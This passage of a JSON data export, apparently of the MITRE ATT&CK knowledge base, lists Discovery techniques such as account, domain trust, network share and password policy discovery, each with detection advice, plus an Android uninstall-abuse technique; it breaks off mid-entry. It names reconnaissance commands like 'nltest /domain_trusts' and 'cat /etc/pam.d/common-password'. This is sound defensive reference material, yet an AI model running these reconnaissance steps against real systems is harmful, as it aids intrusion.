This can be achieved by:<\/p>\n<ul>\n<li>Abusing device owner permissions to perform silent uninstallation using device owner API calls.<\/li>\n<li>Abusing root permissions to delete files from the filesystem.<\/li>\n<li>Abusing the accessibility service. This requires an intent be sent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":803,"platform_id":10,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]}]},{"id":20,"name":"Discovery","source_name":"ENTERPRISE_discovery","sort_id":0,"external_id":"TA0007","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":17,"tactic_id":20},"techniques":[{"id":155,"name":"T1087 - Account Discovery","sort_id":0,"external_id":"T1087","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":155,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":163,"name":"T1010 - Application Window Discovery","sort_id":0,"external_id":"T1010","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":163,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":163,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":172,"name":"T1217 - Browser Bookmark Discovery","sort_id":0,"external_id":"T1217","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools\/dashboards, or other related infrastructure.<\/p>\n<p>Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially <a href=\"https:\/\/attack.mitre.org\/techniques\/T1552\/001\">Credentials In Files<\/a> associated with logins cached by a browser.<\/p>\n<p>Specific storage locations vary based on platform and\/or application, but browser bookmarks are typically stored in local files\/databases.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":172,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":172,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":172,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":181,"name":"T1538 - Cloud Service Dashboard","sort_id":0,"external_id":"T1538","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)<\/p>\n<p>Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":181,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":181,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":181,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":181,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":181,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":182,"name":"T1526 - Cloud Service Discovery","sort_id":0,"external_id":"T1526","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI\/CD), Lambda Functions, Azure AD, etc. <\/p>\n<p>Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)<\/p>\n<p>Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nNormal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":182,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":182,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":182,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":182,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":182,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":182,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":224,"name":"T1482 - Domain Trust Discovery","sort_id":0,"external_id":"T1482","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain\/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct <a href=\"https:\/\/attack.mitre.org\/techniques\/T1134\/005\">SID-History Injection<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\/003\">Pass the Ticket<\/a>, and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1558\/003\">Kerberoasting<\/a>.(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the <code>DSEnumerateDomainTrusts()<\/code> Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility <a href=\"https:\/\/attack.mitre.org\/software\/S0359\">Nltest<\/a> is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest \/domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https:\/\/attack.mitre.org\/techniques\/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https:\/\/attack.mitre.org\/techniques\/T1482).(Citation: Microsoft GetAllTrustRelationships)\n","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":224,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":251,"name":"T1083 - File and Directory Discovery","sort_id":0,"external_id":"T1083","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1083\">File and Directory Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<p>Many command shell utilities can be used to obtain this information. Examples include <code>dir<\/code>, <code>tree<\/code>, <code>ls<\/code>, <code>find<\/code>, and <code>locate<\/code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1106\">Native API<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":251,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":251,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":251,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":302,"name":"T1046 - Network Service Scanning","sort_id":0,"external_id":"T1046","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. <\/p>\n<p>Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":302,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":302,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":302,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":302,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":302,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":302,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":304,"name":"T1135 - Network Share Discovery","sort_id":0,"external_id":"T1135","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. <\/p>\n<p>File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> can be used to query a remote system for available shared drives using the <code>net view \\remotesystem<\/code> command. It can also be used to query shared drives on the local system using <code>net share<\/code>.<\/p>\n<p>Cloud virtual networks may contain remote network shares or file storage services accessible to an adversary after they have obtained access to a system. For example, AWS, GCP, and Azure support creation of Network File System (NFS) shares and Server Message Block (SMB) shares that may be mapped on endpoint or cloud-based systems.(Citation: Amazon Creating an NFS File Share)(Citation: Google File servers on Compute Engine)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be sufficient due to benign use during normal operations.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":304,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":304,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":304,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":304,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":304,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":304,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":313,"name":"T1201 - Password Policy Discovery","sort_id":0,"external_id":"T1201","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a>. This would help the adversary to create a list of common passwords and launch dictionary and\/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).<\/p>\n<p>Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (\/domain)<\/code>, <code>chage -l <username><\/code>, <code>cat \/etc\/pam.d\/common-password<\/code>, and <code>pwpolicy getaccountpolicies<\/code>.(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":313,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":313,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":313,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":315,"name":"T1120 - Peripheral Device Discovery","sort_id":0,"external_id":"T1120","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":315,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":315,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":316,"name":"T1069 - Permission Groups Discovery","sort_id":0,"external_id":"T1069","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":316,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":323,"name":"T1057 - Process 